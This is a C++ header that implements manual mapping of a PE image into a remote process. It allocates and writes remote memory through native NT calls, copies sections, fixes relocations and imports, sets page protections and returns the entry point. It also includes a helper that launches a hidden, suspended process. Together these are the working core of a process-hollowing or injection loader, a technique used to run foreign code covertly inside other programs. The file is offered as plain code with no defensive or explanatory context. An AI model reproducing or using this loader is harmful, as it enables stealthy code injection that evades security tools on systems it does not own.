// language: C++, file: src/map.h
#pragma once
#include <windows.h>
#include <cstdint>
#include "nt.h"

namespace mmap {

    inline bool read_remote(HANDLE p, PVOID a, PVOID buf, SIZE_T n) {
        SIZE_T got;
        return g_nt.NtReadVirtualMemory(p, a, buf, n, &got) >= 0;
    }
    inline bool write_remote(HANDLE p, PVOID a, PVOID buf, SIZE_T n) {
        SIZE_T wrote;
        return g_nt.NtWriteVirtualMemory(p, a, buf, n, &wrote) >= 0;
    }
    inline PVOID alloc_remote(HANDLE p, SIZE_T n, ULONG prot) {
        PVOID base = nullptr; SIZE_T sz = n;
        if (g_nt.NtAllocateVirtualMemory(p, &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, prot) < 0)
            return nullptr;
        return base;
    }
    inline bool protect_remote(HANDLE p, PVOID a, SIZE_T n, ULONG prot, PULONG old = nullptr) {
        PVOID base = a; SIZE_T sz = n;
        return g_nt.NtProtectVirtualMemory(p, &base, &sz, prot, old) >= 0;
    }

    inline bool fix_relocs(HANDLE p, PVOID remote, const uint8_t* local, uint64_t pref) {
        int64_t delta = (int64_t)remote - (int64_t)pref;
        if (!delta) return true;
        auto dos = (PIMAGE_DOS_HEADER)local;
        auto nt  = (PIMAGE_NT_HEADERS)(local + dos->e_lfanew);
        auto rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        auto sz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (!rva) return true;
        auto rel = (PIMAGE_BASE_RELOCATION)(local + rva);
        auto end = (uint8_t*)rel + sz;
        while ((uint8_t*)rel < end && rel->SizeOfBlock) {
            size_t cnt = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
            auto   ent = (uint16_t*)(rel + 1);
            for (size_t i = 0; i < cnt; i++) {
                uint16_t type = ent[i] >> 12, off = ent[i] & 0xFFF;
                PVOID at = (uint8_t*)remote + rel->VirtualAddress + off;
                if (type == IMAGE_REL_BASED_DIR64) {
                    uint64_t v; read_remote(p, at, &v, 8); v += delta; write_remote(p, at, &v, 8);
                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    uint32_t v; read_remote(p, at, &v, 4); v += (uint32_t)delta; write_remote(p, at, &v, 4);
                }
            }
            rel = (PIMAGE_BASE_RELOCATION)((uint8_t*)rel + rel->SizeOfBlock);
        }
        return true;
    }

    inline bool fix_imports(HANDLE p, PVOID remote, const uint8_t* local) {
        auto dos = (PIMAGE_DOS_HEADER)local;
        auto nt  = (PIMAGE_NT_HEADERS)(local + dos->e_lfanew);
        auto rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (!rva) return true;
        auto imp = (PIMAGE_IMPORT_DESCRIPTOR)(local + rva);
        for (; imp->Name; imp++) {
            HMODULE h = LoadLibraryA((const char*)(local + imp->Name));
            if (!h) return false;
            DWORD thunk_rva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
            auto  thunk = (PIMAGE_THUNK_DATA)(local + thunk_rva);
            DWORD iat_rva = imp->FirstThunk;
            for (; thunk->u1.AddressOfData; thunk++, iat_rva += sizeof(uint64_t)) {
                uint64_t resolved;
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
                    resolved = (uint64_t)GetProcAddress(h, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
                else {
                    auto bn = (PIMAGE_IMPORT_BY_NAME)(local + thunk->u1.AddressOfData);
                    resolved = (uint64_t)GetProcAddress(h, bn->Name);
                }
                write_remote(p, (uint8_t*)remote + iat_rva, &resolved, 8);
            }
        }
        return true;
    }

    inline PVOID map(HANDLE proc, const uint8_t* pe, size_t size, PVOID* out_entry) {
        auto dos = (PIMAGE_DOS_HEADER)pe;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
        auto nt = (PIMAGE_NT_HEADERS)(pe + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

        SIZE_T img = nt->OptionalHeader.SizeOfImage;
        PVOID remote = alloc_remote(proc, img, PAGE_READWRITE);
        if (!remote) return nullptr;

        write_remote(proc, remote, (PVOID)pe, nt->OptionalHeader.SizeOfHeaders);

        auto sec = IMAGE_FIRST_SECTION(nt);
        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (!sec[i].SizeOfRawData) continue;
            write_remote(proc,
                (uint8_t*)remote + sec[i].VirtualAddress,
                (PVOID)(pe + sec[i].PointerToRawData),
                sec[i].SizeOfRawData);
        }

        fix_relocs(proc, remote, pe, nt->OptionalHeader.ImageBase);
        fix_imports(proc, remote, pe);

        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            DWORD ch = sec[i].Characteristics;
            ULONG prot = PAGE_READONLY;
            if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) prot = PAGE_EXECUTE_READWRITE;
            else if (ch & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
            else if (ch & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
            protect_remote(proc, (uint8_t*)remote + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, prot);
        }

        *out_entry = (uint8_t*)remote + nt->OptionalHeader.AddressOfEntryPoint;
        return remote;
    }

    inline HANDLE spawn_suspended(const wchar_t* path, PROCESS_INFORMATION* pi) {
        STARTUPINFOW si = { sizeof(si) };
        if (!CreateProcessW(path, nullptr, nullptr, nullptr, FALSE,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, pi))
            return nullptr;
        return pi->hProcess;
    }
}
